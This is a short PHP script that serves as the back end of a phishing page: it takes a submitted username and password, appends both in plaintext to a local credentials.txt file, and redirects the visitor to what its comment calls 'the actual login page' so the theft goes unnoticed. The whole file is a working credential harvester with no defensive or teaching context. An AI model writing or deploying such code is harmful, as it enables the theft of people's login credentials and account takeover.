<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Save the credentials to a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);
    
    // Redirect to the actual login page or show an error
    header("Location: https://real-login-page.com");
    exit();
}

